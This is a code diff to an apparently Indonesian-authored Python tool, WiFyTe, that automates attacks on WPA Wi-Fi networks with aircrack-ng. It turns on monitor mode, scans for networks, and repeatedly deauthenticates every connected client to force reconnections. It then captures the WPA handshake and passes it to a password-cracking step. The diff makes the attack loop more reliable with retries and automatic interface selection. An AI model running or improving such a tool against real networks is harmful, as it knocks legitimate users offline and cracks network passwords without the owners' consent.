@@ -27,11 +27,18 @@ def detect_monitor_interfaces():
     return interfaces
 
 
+def is_monitor_mode_active(interface):
+    """Check if the interface is already in monitor mode."""
+    stdout, _ = run_command(f"iwconfig {interface} 2>&1")
+    return "Mode:Monitor" in stdout
+
+
 def enable_monitor_mode(interface):
     """Enable monitor mode on the given interface."""
-    print(f"Enabling monitor mode on {interface}...")
-    run_command(f"sudo airmon-ng check kill")
-    run_command(f"sudo airmon-ng start {interface}")
+    if not is_monitor_mode_active(interface):
+        print(f"Enabling monitor mode on {interface}...")
+        run_command(f"sudo airmon-ng check kill")
+        run_command(f"sudo airmon-ng start {interface}")
     monitor_interface = f"{interface}mon"
     return monitor_interface
 
@@ -105,28 +112,46 @@ def select_target(networks):
 
 
 def capture_handshake(monitor_interface, target):
-    """Capture the WPA handshake for the target network."""
-    print(f"\nCapturing handshake for {target['ESSID']}...")
+    """Attempt to capture the WPA handshake for the target network."""
     output_file = f"{target['ESSID']}_capture"
-    command = f"sudo airodump-ng --bssid {target['BSSID']} -c {target['Channel']} -w {output_file} {monitor_interface}"
-    process = subprocess.Popen(command, shell=True)
+    for attempt in range(3):  # Maksimal 3 percobaan
+        print(
+            f"\nAttempt {attempt + 1}/3: Capturing handshake for {target['ESSID']}..."
+        )
 
-    # Deauthenticate clients
-    print("Deauthenticating clients to force reconnection...")
-    deauth_command = (
-        f"sudo aireplay-ng --deauth 10 -a {target['BSSID']} {monitor_interface}"
-    )
-    run_command(deauth_command)
+        # Deteksi klien selama 12 detik
+        print("Detecting connected clients...")
+        client_process = subprocess.Popen(
+            f"sudo airodump-ng --bssid {target['BSSID']} -c {target['Channel']} {monitor_interface}",
+            shell=True,
+        )
+        time.sleep(12)
+        client_process.terminate()
 
-    # Check for handshake
-    print("Waiting for handshake...")
-    while True:
+        # Kick semua klien terhubung
+        print("Deauthenticating all connected clients...")
+        run_command(
+            f"sudo aireplay-ng --deauth 10 -a {target['BSSID']} {monitor_interface}"
+        )
+
+        # Tangkap handshake selama 10 detik
+        print("Waiting for handshake...")
+        capture_process = subprocess.Popen(
+            f"sudo airodump-ng --bssid {target['BSSID']} -c {target['Channel']} -w {output_file} {monitor_interface}",
+            shell=True,
+        )
+        time.sleep(10)
+        capture_process.terminate()
+
+        # Periksa apakah handshake berhasil ditangkap
         if os.path.exists(f"{output_file}-01.cap"):
             print("Handshake captured!")
-            process.terminate()
             return f"{output_file}-01.cap"
-        else:
-            time.sleep(1)
+
+        print("Handshake not captured. Retrying...")
+
+    print("Failed to capture handshake after 3 attempts. Exiting.")
+    return None
 
 
 def crack_password(capture_file, target):
@@ -162,19 +187,30 @@ if __name__ == "__main__":
         print("No wireless interfaces found that support monitor mode. Exiting.")
         sys.exit(1)
 
-    print("Detected wireless interfaces:")
-    for i, interface in enumerate(interfaces):
-        print(f"{i + 1}. {interface}")
+    # Pilih antarmuka secara otomatis
+    selected_interface = interfaces[0]
+    print(f"Using wireless interface: {selected_interface}")
 
-    choice = int(input("Select an interface to use: ")) - 1
-    selected_interface = interfaces[choice]
-
+    # Aktifkan monitor mode jika belum aktif
     monitor_interface = enable_monitor_mode(selected_interface)
+
+    # Pemindaian jaringan
     networks = scan_networks(monitor_interface)
     target = select_target(networks)
+
+    # Penangkapan handshake
     capture_file = capture_handshake(monitor_interface, target)
+    if not capture_file:
+        cleanup = input("\nDo you want to disable monitor mode? (y/n): ").lower()
+        if cleanup == "y":
+            disable_monitor_mode(monitor_interface)
+        print("Exiting WiFyTe. Goodbye!")
+        sys.exit(1)
+
+    # Cracking password
     password = crack_password(capture_file, target)
 
+    # Pembersihan
     cleanup = input("\nDo you want to disable monitor mode? (y/n): ").lower()
     if cleanup == "y":
         disable_monitor_mode(monitor_interface)
